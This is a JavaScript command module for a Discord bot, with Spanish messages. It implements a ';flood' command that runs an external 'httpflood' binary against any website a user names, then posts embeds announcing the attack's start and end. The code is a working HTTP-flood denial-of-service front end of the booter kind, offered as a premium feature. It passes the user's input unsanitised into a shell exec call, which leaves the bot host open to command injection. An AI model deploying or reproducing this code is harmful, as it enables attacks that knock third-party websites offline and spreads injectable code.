const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const thread = message.content.split (" ")[2]
const time = message.content.split (" ")[3]
const ayarlar = require('../admin.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⚠️ ADVERTENCIA')
	.setDescription("`Formato: ;flood https://example.com/`")
	.setFooter("Por favor no ataque sitios web con dominio .gov/.edu")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`./httpflood ${host} ${thread} post ${time} nil`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Ataque detenido ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **Mc R** 🔥')
	.setTimestamp()
	.setDescription("**► ¡Ataque finalizado 💥**")
	.setFooter('© Developer: Mac#1770', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Iniciando ataque ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **Mc R** 🔥')
	.setTimestamp()
	.setDescription("**Usuario**: `PREMIUM ☭` \n **Servidor**: `" + host + "` \n **Método**: `Flood 💥` \n **Tiempo**: `60 segundos 🕒` \n **Si detectamos que atacas sitios .gov/.edu, serás baneado del servidor**")
	.setFooter('© Developer: Mac#1770', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['flood'],
  permLevel: 0
}

exports.help = {
  name: 'flood',
  description: 'Mac',
  usage: 'flood'
}